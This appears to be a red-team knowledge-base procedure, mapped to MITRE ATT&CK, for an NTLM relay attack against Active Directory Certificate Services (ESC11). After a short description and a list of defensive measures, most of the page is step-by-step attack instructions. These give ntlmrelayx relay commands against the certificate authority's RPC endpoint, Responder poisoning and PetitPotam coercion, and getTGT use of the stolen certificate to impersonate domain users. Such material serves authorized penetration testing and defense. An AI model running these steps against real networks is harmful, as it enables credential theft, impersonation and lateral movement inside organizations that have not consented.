---
id: 763f048b-aeb0-437a-ac43-4146480d33ce
name: NTLM-Relay-Attack-against-Active-Directory-Certificate-Services
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:06.112777+00:00'
updated_at: '2023-04-10T20:26:28.111396+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
  - >-
    [[techniques/Use-Alternate-Authentication-Material|T1550 - Use Alternate
    Authentication Material]]
sub_techniques:
  - >-
    [[techniques/Adversary-in-the-Middle/LLMNR-NBT-NS-Poisoning-and-SMB-Relay|T1557.001]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Active Directory Certificate Services]]'
  - '[[tags/ESC11 - Relaying NTLM to ICPR]]'
commands:
  - '[[commands/ntlmrelayx-relay-to-adcs-icpr]]'
platforms:
  - Windows
tools:
  - '[[tools/Impacket]]'
skill_level: advanced
impact_level: high
detection_risk: high
validated: true
---

# NTLM-Relay-Attack-against-Active-Directory-Certificate-Services

## Summary

This procedure demonstrates how to perform an NTLM relay attack targeting Active Directory Certificate Services (AD CS) to obtain a valid certificate using relayed credentials. By intercepting NTLM authentication from a victim machine and relaying it to the AD CS server via RPC, an attacker can request and export a certificate that enables impersonation of domain users for further lateral movement and access to network resources.

## Description

In an NTLM relay attack against AD CS, the attacker positions themselves to capture NTLM authentication attempts from a victim (e.g., via SMB or HTTP) and relays them to the AD CS server's RPC endpoint. This exploits the trust in NTLM authentication to request a certificate from the Certificate Authority (CA) without knowing the victim's password. The resulting certificate can be used for authentication to other services, such as RDP or LDAP, allowing privilege escalation or persistence. This technique is particularly effective in environments with misconfigured AD CS templates that permit enrollment by low-privileged accounts. Prerequisites include network access to both the victim and AD CS server, and tools like Impacket for handling the relay. The attack assumes the attacker has coerced or poisoned the victim into authenticating to a controlled listener.

## Requirements

1. Compromised foothold on a victim domain-joined Windows machine with network access to the AD CS server.
2. Ability to intercept and relay NTLM traffic (e.g., via LLMNR/NBT-NS poisoning or coercion tools like Responder).
3. Impacket suite installed on the attacker's machine (Kali Linux or similar).
4. Knowledge of the AD CS server's IP/hostname and CA name (e.g., from enumeration).
5. The AD CS template must allow certificate enrollment via RPC without additional controls like HTTP-only enrollment.

## Defense

- Enable Extended Protection for Authentication (EPA) on AD CS to prevent relay attacks.
- Disable NTLM where possible and enforce Kerberos or LDAP signing.
- Implement network segmentation to isolate AD CS servers and monitor for anomalous RPC traffic to port 445 or 135.
- Use certificate template restrictions to limit enrollment rights and require manager approval.
- Deploy tools like Microsoft ATA or monitor for unexpected certificate issuances in event logs (Event ID 4886).

## Objectives

1. Relay NTLM authentication from a victim to the AD CS RPC endpoint to request a certificate.
2. Export the obtained certificate for use in impersonating the victim user.
3. Enable lateral movement or persistence using the certificate for authentication to other domain services.

## Instructions

### Step 1: Prepare the Relay Listener

**Context**: Set up the NTLM relay server using Impacket's ntlmrelayx to listen for incoming NTLM authentications and configure it to target the AD CS server's RPC interface in ICPR mode. This mode specifically handles relay to the ICertRequest interface for certificate enrollment.

**Command** ([[commands/ntlmrelayx-relay-to-adcs-icpr]]):
```bash
ntlmrelayx.py -t rpc://<ADCS_SERVER_IP> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support
```

> This command starts the relay listener. Replace `<ADCS_SERVER_IP>` with the IP of the AD CS server (e.g., 10.10.10.10) and `<CA_NAME>` with the CA name (e.g., lab-DC-CA). The `-smb2support` flag enables SMB2 protocol handling for modern Windows systems. Expected output includes a message like "Relay server listening on port 445" indicating the listener is active. Verify no errors in CA name resolution.

### Step 2: Trigger Victim Authentication

**Context**: Coerce the victim machine to authenticate to the attacker's relay listener. This can be done by poisoning name resolution (e.g., using Responder) or forcing SMB connections via tools like PetitPotam for coercion over MS-EFSRPC.

**Command** (Use external tool like Responder or coercion):
```bash
# Example with Responder (install separately)
responder -I eth0 -wrd
```

> Run Responder or a similar tool on the attacker's interface to spoof responses and capture NTLM auth. Alternatively, use coercion: `python petitpotam.py <ATTACKER_IP> <TARGET_IP>`. Expected output: Captured NTLM hash or challenge-response in the relay logs. The victim will attempt to connect (e.g., to a fake share), triggering the relay.

### Step 3: Verify Certificate Issuance and Export

**Context**: Once relayed, ntlmrelayx will automatically request and save the certificate. Check the output for success and export the .p12 file for use.

**Command** (No direct command; monitor relay output):
```bash
# The relay will output: "Certificate saved to /path/to/<username>-icpr.p12"
```

> Monitor the ntlmrelayx console for messages like "Relayed authentication to ICPR" and "Certificate exported". If successful, a .p12 file containing the certificate and private key will be saved. Use `openssl pkcs12 -in <file>.p12 -info` to verify contents. Failure indicators: Authentication rejected or no certificate file created (check AD CS logs for Event ID 4887).

### Step 4: Use the Certificate for Impersonation

**Context**: Convert and use the certificate for authentication, e.g., via S4U2self for ticket delegation or direct auth to services.

**Command** (Example with Impacket's getTGT.py for Kerberos ticket):
```bash
getTGT.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>@<DOMAIN> -cert-pfx <certificate.p12> -pfx-pass ''
```

> This extracts a TGT using the certificate. Expected output: A .ccache file for Kerberos auth. Success allows further actions like `getST.py` for service tickets.
